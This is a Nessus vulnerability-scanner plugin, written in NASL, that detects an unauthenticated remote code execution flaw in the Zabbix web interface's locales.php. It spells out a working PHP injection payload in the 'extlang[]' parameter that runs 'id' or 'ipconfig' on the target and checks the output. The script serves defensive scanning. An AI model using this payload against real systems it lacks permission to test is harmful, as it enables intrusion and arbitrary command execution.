#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(35787);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(33965);
  script_osvdb_id(52403, 52404, 52405);
  script_xref(name:"EDB-ID", value:"8140");
  script_xref(name:"Secunia", value:"34091");

  script_name(english:"Zabbix Web Interface extlang[] Parameter Remote Code Execution");
  script_summary(english:"Tries to execute an arbitrary command on the host");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is prone to a remote
command execution attack.");
  script_set_attribute(attribute:"description", value:
"The remote web server hosts a version of the Zabbix web interface that
is affected by a remote code execution vulnerability.  The vulnerability
involves the 'extlang[]' parameter of the 'locales.php' script.
Provided PHP's 'magic_quotes_gpc' setting is disabled, an
unauthenticated, remote attacker can exploit this to execute arbitrary
code on the remote host subject to the privileges of the web server user
id.

Note that this version of the Zabbix web interface is also likely
affected by a local file include vulnerability and a cross-site request
forgery vulnerability.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/501400/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.zabbix.com/rn1.6.3.php");
  script_set_attribute(attribute:"solution", value:"Upgrade to Zabbix 1.6.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/03/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zabbix:zabbix");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("zabbix_frontend_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/zabbix");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

os = get_kb_item("Host/OS");
if (report_paranoia < 2 && os)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';
  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');
cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig'] = "Subnet Mask";

# Test an install
install = get_install_from_kb(appname:"zabbix", port:port);
if (isnull(install)) exit(0, "Zabbix frontend does not appear to be on port "+port+".");
dir = install['dir'];

# Try to run a command
foreach cmd (cmds)
{
  url = string(
    dir, "/locales.php?",
    "download&",
    "langTo&",
    'extlang[".system("', urlencode(str:cmd), '")."]=1'
  );
  res = http_send_recv3(item:url, method:"GET", port:port, exit_on_fail:TRUE);

  # There's a problem if we see the expected command output.
  if ('ipconfig' >< cmd) pat = cmd_pats['ipconfig'];
  else pat = cmd_pats['id'];

  if (egrep(pattern:pat, string:res[2]))
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote \n",
        "host using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        output = res[2];
        output = output - strstr(output, '[error]');
        report = string(
          report,
          "\n",
          "It produced the following output :\n",
          "\n",
          "  ", output, "\n",
          "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
